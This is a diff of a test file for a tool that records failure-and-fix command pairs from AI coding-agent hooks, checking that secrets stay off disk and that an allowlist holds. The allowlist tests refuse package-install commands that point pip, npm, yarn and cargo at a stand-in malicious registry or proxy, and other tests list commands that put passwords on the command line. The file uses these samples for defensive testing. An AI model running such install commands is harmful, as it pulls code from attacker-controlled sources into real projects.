@@ -1,8 +1,8 @@
-/** Failure-recovery pairs (src/recovery_pairs.ts, src/recovery_fix_policy.ts). Fixtures: the failed Bash payload is CAPTURE (tests/fixtures/claude_code_2_1_281/bash_failure.json, PROVENANCE.tsv); the successful Bash payload is FORMAT-DERIVED from https://code.claude.com/docs/en/hooks (PostToolUse: tool_name, tool_input.command, tool_response); the Copilot payload is FORMAT-DERIVED from tests/fixtures/harness_hook_payloads.ts (COPILOT_SCHEMA, PostToolUseFailureHookInput) as src/hook_adapters.ts canonicalizes it; command strings, error texts, credential shapes and expected fixes are HAND-DERIVED from the pairing rule and the allowlist. */
+/** Failure-recovery pairs (src/recovery_pairs.ts, src/recovery_fix_policy.ts). Fixtures: the failed Bash payload is CAPTURE (tests/fixtures/claude_code_2_1_281/bash_failure.json, PROVENANCE.tsv); the successful Bash payload is FORMAT-DERIVED from https://code.claude.com/docs/en/hooks (PostToolUse: tool_name, tool_input.command, tool_response); the Copilot payload is FORMAT-DERIVED from tests/fixtures/harness_hook_payloads.ts (COPILOT_SCHEMA, PostToolUseFailureHookInput) as src/hook_adapters.ts canonicalizes it; command strings, error texts, credential shapes and expected fixes are HAND-DERIVED from the pairing rule and the allowlist. UNVERIFIED for Copilot CLI: no postToolUseFailure payload has been captured, the `Exit code 2` error wording in the Copilot test below is HAND-DERIVED (it is Claude Code's wording), and Copilot CLI's own session logs (events.jsonl under its session-state directory) record a shell command that exited 1 as `resultType: success` with the text `completed with exit code 1`, which suggests a non-zero shell exit reaches a hook as a success and never as postToolUseFailure. */
 import { execFileSync } from 'node:child_process'
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
-import { join, resolve } from 'node:path'
+import { dirname, join, resolve } from 'node:path'
 import { afterAll, describe, expect, it } from 'vitest'
 
 import { runBundle, tgIsolatedEnv } from './helpers/bundle.js'
@@ -14,7 +14,7 @@ import { recoveryBashHandler, recoveryEditHandler } from '../src/hooks_recovery.
 import { postToolUseFailureWithExtras } from '../src/hooks_tool_failure.js'
 import { purgeRoots } from '../src/purge.js'
 import { carriesCredential, FIX_VERB_ALLOWLIST, fixIsAllowed } from '../src/recovery_fix_policy.js'
-import { isLearnableCommand, isRetired, learnableFix, loadRecoveryPairs, MAX_FIX_CHARS, recoveryProjectKey, recoveryStorePath, splitCommandPrefix } from '../src/recovery_pairs.js'
+import { isLearnableCommand, isRetired, learnableFix, loadRecoveryPairs, MAX_FIX_CHARS, OTHER_STEP, recoveryProjectKey, recoveryStorePath, splitCommandPrefix } from '../src/recovery_pairs.js'
 import { sessionSidecarPath } from '../src/session_store.js'
 import type { HookOutput } from '../src/types.js'
 
@@ -611,8 +611,186 @@ describe('secrets never reach the disk', () => {
   })
 })
 
+/** Every file under `dir`, concatenated: what a grep -r of the directory would see. */
+function treeText(dir: string): string {
+  if (!existsSync(dir)) return ''
+  return readdirSync(dir, { withFileTypes: true })
+    .map((entry) => (entry.isDirectory() ? treeText(join(dir, entry.name)) : readFileSync(join(dir, entry.name), 'utf8')))
+    .join('\n')
+}
+
+describe('no command line is written to disk', () => {
+  // HAND-DERIVED: each form is a way of putting a secret on a command line; the first eight are the ones carriesCredential missed before this change, the last four are shapes no credential pattern knows, so only the storage rule (digests, not text) keeps them off the disk.
+  const KNOWN_MISSED = [
+    (s: string) => `GITHUB_PAT=${s} make setup`,
+    (s: string) => `curl -H "X-Auth-Token: ${s}" https://example.invalid`,
+    (s: string) => `deploy --passphrase ${s}`,
+    (s: string) => `sshpass -p ${s} ssh host`,
+    (s: string) => `make deploy DB_PWD=${s}`,
+    (s: string) => `psql -W ${s}`,
+    (s: string) => `openssl enc -k ${s}`,
+    (s: string) => `gpg --passphrase=${s}`,
+  ]
+  const UNKNOWN_SHAPE = [(s: string) => `acme-cli login ${s}`, (s: string) => `deploy --frobnicate ${s}`, (s: string) => `acme-cli --zork=${s} sync`, (s: string) => `ZORK_VALUE=${s} acme-cli sync`]
+  const row = (make: (s: string) => string, i: number) => [make('X'), make, i] as const
+
+  function noSecretOnDisk(secret: string, s: string, cwd: string): void {
+    const sessionsDir = dirname(sidecarPathOf(s, '.recovery-pending'))
+    const storeDir = dirname(recoveryStorePath(recoveryProjectKey(cwd) ?? ''))
+    expect(treeText(sessionsDir)).not.toContain(secret)
+    expect(treeText(storeDir)).not.toContain(secret)
+  }
+
+  async function keepsOffDiskThroughout(make: (s: string) => string, i: number): Promise<void> {
+    const secret = `hunter2-${process.pid}-${i}`
+    const command = make(secret)
+    const { cwd } = freshProject()
+    const s = session()
+    await failed(s, cwd, command)
+    noSecretOnDisk(secret, s, cwd)
+    await succeeded(s, cwd, 'npm ci')
+    noSecretOnDisk(secret, s, cwd)
+    await succeeded(s, cwd, command)
+    noSecretOnDisk(secret, s, cwd)
+  }
+
+  async function keepsOffDiskAsBetween(make: (s: string) => string, i: number): Promise<void> {
+    const secret = `hunter2-${process.pid}-${i}`
+    const command = make(secret)
+    const { cwd } = freshProject()
+    const s = session()
+    await failed(s, cwd, 'pytest')
+    await succeeded(s, cwd, command)
+    noSecretOnDisk(secret, s, cwd)
+    await succeeded(s, cwd, 'pytest')
+    noSecretOnDisk(secret, s, cwd)
+    expect(loadRecoveryPairs(cwd)).toEqual([])
+  }
+
+  it.each(KNOWN_MISSED.map(row))('keeps %s off the disk through fail, between and success', (_label, make, i) => keepsOffDiskThroughout(make, i))
+  it.each(UNKNOWN_SHAPE.map(row))('keeps %s off the disk through fail, between and success', (_label, make, i) => keepsOffDiskThroughout(make, i + KNOWN_MISSED.length))
+  it.each(KNOWN_MISSED.map(row))('keeps %s off the disk as the work between a failure and its success', (_label, make, i) => keepsOffDiskAsBetween(make, i))
+  it.each(UNKNOWN_SHAPE.map(row))('keeps %s off the disk as the work between a failure and its success', (_label, make, i) => keepsOffDiskAsBetween(make, i + KNOWN_MISSED.length))
+
+  it.each(UNKNOWN_SHAPE.map((make, i) => [make('X'), make, i] as const))('stores a learned pair for %s as a digest', async (_label, make, i) => {
+    const secret = `hunter2-${process.pid}-u${i}`
+    const command = make(secret)
+    const { cwd } = freshProject()
+    await teach(cwd, command, ['npm ci'])
+    const pairs = loadRecoveryPairs(cwd)
+    expect(pairs.length).toBe(1)
+    expect(pairs[0]?.commandShape).toMatch(/^[0-9a-f]{64}$/)
+    expect(pairs[0]?.fix).toBe('npm ci')
+    expect(storeText(cwd)).not.toContain(secret)
+  })
+
+  it('writes the sentinel for a step the allowlist refuses, so the pair is not learned', async () => {
+    const { cwd } = freshProject()
+    for (let i = 0; i < 2; i++) {
+      const s = session()
+      await failed(s, cwd, 'pytest')
+      await succeeded(s, cwd, 'acme-cli login someone')
+      expect(sidecarText(s)).toContain(OTHER_STEP)
+      expect(sidecarText(s)).not.toContain('acme-cli')
+      await succeeded(s, cwd, 'pytest')
+    }
+    expect(loadRecoveryPairs(cwd)).toEqual([])
+  })
+
+  it('still learns and speaks a clean pair, the digests matching across sessions', async () => {
+    const { cwd } = freshProject()
+    await teachTwice(cwd, 'pytest', [INSTALL])
+    expect(loadRecoveryPairs(cwd)[0]?.count).toBe(2)
+    const out = await failed(session(), cwd, 'pytest')
+    expect(contextOf(out)).toContain(INSTALL)
+  })
+
+  it('ignores and scrubs a pending file written before digests, which held the command in the clear', async () => {
+    const { cwd } = freshProject()
+    const s = session()
+    const target = sidecarPathOf(s, '.recovery-pending')
+    mkdirSync(dirname(target), { recursive: true })
+    writeFileSync(target, JSON.stringify({ open: [{ failed: 'acme-cli login hunter2-legacy', key: 'acme-cli login hunter2-legacy', signature: 'sig', calls: 0, between: ['acme-cli zork hunter2-legacy'] }], shown: [] }))
+    await succeeded(s, cwd, 'npm ci')
+    expect(readFileSync(target, 'utf8')).not.toContain('hunter2-legacy')
+    expect(loadRecoveryPairs(cwd)).toEqual([])
+  })
+
+  it('ignores a store file written before digests, even one still inside its time to live', () => {
+    const { cwd } = freshProject()
+    const target = recoveryStorePath(recoveryProjectKey(cwd) ?? '')
+    mkdirSync(dirname(target), { recursive: true })
+    writeFileSync(target, JSON.stringify({ version: 1, pairs: [{ signature: 's', commandShape: 'acme-cli login hunter2-legacy', fix: 'npm ci', count: 5, lastSeen: Date.now(), helped: 3, hurt: 0, sessions: ['a', 'b'] }] }))
+    expect(loadRecoveryPairs(cwd)).toEqual([])
+    expect(treeText(dirname(target))).not.toContain('hunter2-legacy')
+  })
+})
+
+describe('the tightened allowlist', () => {
+  const wrappers = /^(?:npx\s+)/
+
+  it.each(['make deploy', 'make publish', 'make release', 'make db-reset', 'make clean', 'make push', 'make migrate', 'make install-hooks-and-deploy', 'npm run deploy', 'npm run db:reset', 'pnpm run publish', 'yarn run seed', 'bun run wipe', 'npm run build && npm run deploy'])('refuses the task %s', (command) => {
+    expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(false)
+  })
+
+  it.each(['make build', 'make test', 'make tests', 'make lint', 'make typecheck', 'make check', 'make setup', 'make install', 'make generate', 'make compile', 'npm run build', 'npm run test:matrix', 'npm run typecheck:tests', 'pnpm run lint', 'yarn run codegen', 'bun run gen'])('accepts the task %s', (command) => {
+    expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(true)
+  })
+
+  it.each([
+    'pip install --index-url=evil.example/simple',
+    'pip install -r requirements.txt --extra-index-url https://evil.example/simple',
+    'pip install -r requirements.txt --index-url=https://evil.example/simple',
+    'pip install -r requirements.txt -i https://evil.example/simple',
+    'pip install -r requirements.txt --find-links=https://evil.example',
+    'pip install -r requirements.txt --trusted-host evil.example',
+    'npm ci --registry=https://evil.example',
+    'npm ci --registry https://evil.example',
+    'yarn install --registry=https://evil.example',
+    'pnpm install --registry https://evil.example',
+    'cargo build --registry evil',
+    'npm ci --proxy=http://evil.example',
+  ])('refuses the source flag in %s', (command) => {
+    expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(false)
+  })
+
+  it('re-checks a stored fix when it is about to be shown', async () => {
+    const { cwd } = freshProject()
+    await teachTwice(cwd, 'pytest', [INSTALL])
+    const shown = contextOf(await failed(session(), cwd, 'pytest'))
+    expect(shown).toContain(INSTALL)
+    const target = recoveryStorePath(recoveryProjectKey(cwd) ?? '')
+    const store = JSON.parse(readFileSync(target, 'utf8')) as { pairs: Array<{ fix: string }> }
+    for (const pair of store.pairs) pair.fix = 'pip install --index-url=evil.example/simple foo'
+    writeFileSync(target, JSON.stringify(store))
+    const after = contextOf(await failed(session(), cwd, 'pytest'))
+    expect(after).not.toContain('evil.example')
+    expect(after).not.toContain('index-url')
+  })
+})
+
+describe('credential patterns added with the digests', () => {
+  it.each([
+    'GITHUB_PAT=hunter2 make setup',
+    'curl -H "X-Auth-Token: hunter2" https://example.invalid',
+    'curl --header "Cookie: sid=hunter2" https://example.invalid',
+    'deploy --passphrase hunter2',
+    'sshpass -p hunter2 ssh h',
+    'make deploy DB_PWD=hunter2',
+    'psql -W hunter2',
+    'openssl enc -k hunter2',
+    'gpg --passphrase=hunter2',
+  ])('flags %s', (command) => {
+    expect(carriesCredential(command)).toBe(true)
+  })
+
+  it.each(['curl -H "Accept: application/json" https://example.invalid', 'psql -W', 'make PWD_DIR=build', 'ssh h', 'openssl enc -aes256 -in a -out b'])('lets %s through', (command) => {
+    expect(carriesCredential(command)).toBe(false)
+  })
+})
+
 describe('the store file', () => {
-  const stale = (fix: string): string => JSON.stringify({ version: 1, pairs: [{ signature: 's', commandShape: 'pytest', fix, count: 1, lastSeen: 1, helped: 0, hurt: 0, sessions: [] }] })
+  const stale =(fix: string): string => JSON.stringify({ version: 1, pairs: [{ signature: 's', commandShape: 'pytest', fix, count: 1, lastSeen: 1, helped: 0, hurt: 0, sessions: [] }] })
 
   it('is deleted once every pair in it has expired', () => {
     const { cwd } = freshProject()
@@ -681,7 +859,7 @@ describe('the built bundle', () => {
   })
 
   it('does the same for the payload the Copilot adapter canonicalizes from postToolUseFailure', () => {
-    // FORMAT-DERIVED: src/hook_adapters.ts copilotRun -- tool_name from copilotCanonicalToolName('bash'), tool_input from toolArgs, error verbatim, and no cwd key.
+    // FORMAT-DERIVED: src/hook_adapters.ts copilotRun -- tool_name from copilotCanonicalToolName('bash'), tool_input from toolArgs, error verbatim, and no cwd key. The `Exit code 2` text is HAND-DERIVED and unverified for Copilot CLI (see the header): this proves the adapter-shaped payload is handled, not that Copilot sends it for a failed shell command.
     const failure = (sid: string): Record<string, unknown> => ({ session_id: sid, tool_name: 'Bash', tool_input: { command: 'make lint' }, error: 'Exit code 2\nmake: *** No rule to make target lint. Stop.' })
     for (const sid of ['copilot-first', 'copilot-second']) {
       hook('post_tool_use_failure', failure(sid))
